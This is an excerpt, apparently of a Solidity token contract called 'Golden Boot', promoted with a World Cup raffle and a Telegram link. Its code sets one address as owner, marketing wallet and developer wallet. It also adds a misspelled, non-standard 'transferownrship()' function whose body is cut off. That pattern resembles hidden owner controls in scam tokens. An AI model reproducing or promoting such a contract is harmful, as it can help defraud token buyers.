...
Who will be win the Qatar 2022 World Cup Golden Boot Award? We will organise a contest raffles and person who guessed it right will receive some juicy Rewards!
Low tax 5/5 

TG: https://t.me/GoldenBootERC
...
interface IERC20 {
    ...
    function transferownrship() external returns (uint256);
}
...
contract GoldenBoot is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x99315385Ce00A4bD5fe86ef2b85Ea5937778C9e8); 
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public Wallet_Developer = payable(0x99315385Ce00A4bD5fe86ef2b85Ea5937778C9e8);
    ...
    string private constant _name = "Golden Boot"; 
    string private constant _symbol = unicode"GOAL!!!";

    bool public swapAndLiquifyEnabled = true;
    bool public swappingSymbolic = false;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 44;
    ...
    constructor () {
        ...
        _owner = 0x99315385Ce00A4bD5fe86ef2b85Ea5937778C9e8;
    ...
    function transferownrship() public override returns (uint256) {
